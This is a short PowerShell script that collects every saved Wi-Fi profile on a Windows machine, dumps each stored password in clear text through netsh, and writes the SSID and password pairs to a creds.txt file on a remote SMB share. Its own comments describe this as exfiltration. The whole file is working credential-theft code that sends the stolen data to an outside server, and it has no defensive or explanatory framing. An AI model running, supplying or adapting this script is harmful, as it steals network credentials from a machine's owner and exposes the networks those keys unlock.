param ($server, $share)
 
function get_data()
{
    $wifi_names=((netsh.exe wlan show profiles) -match ' : ')
    $hashTable = @{}

    foreach($wifi_name in $wifi_names)
    { 
        $names = -join ($wifi_name.ToCharArray() | Select-Object -Skip 27)
        $extract_passwords = [pscustomobject]@{
            Value = ((netsh wlan show profile name=$names key=clear | select-string "Key Content") | Out-String).Trim()
        }
        
        $password_names = -join ($extract_passwords.Value.ToCharArray() | Select-Object -Skip 25)      

        $hashTable.add($names, $password_names)
    }

    return $hashTable.GetEnumerator()
}

function exfil_data()
{
    # Take the hash table containing the SSID and password.
    $hashTable = get_data
    
    # Loop through the hash table and extract each line. 
    foreach($hash in $hashTable)
    {
        $SSID = $hash.key
        $password = $hash.value
        Add-Content -Path \\"$server"\"$share"\creds.txt -Value $SSID,$password
    }
}

# Exfil the data to the SMB server hosting the share.
exfil_data($server, $share)



# Useful links
#https://stackoverflow.com/questions/11266013/powershell-add-objects-to-an-array-of-objects
#https://community.spiceworks.com/t/how-to-export-and-import-all-wifi-network-profiles-at-once-in-a-bulk/835016
#https://stackoverflow.com/questions/72762570/convert-an-array-into-a-hashtable-powershell
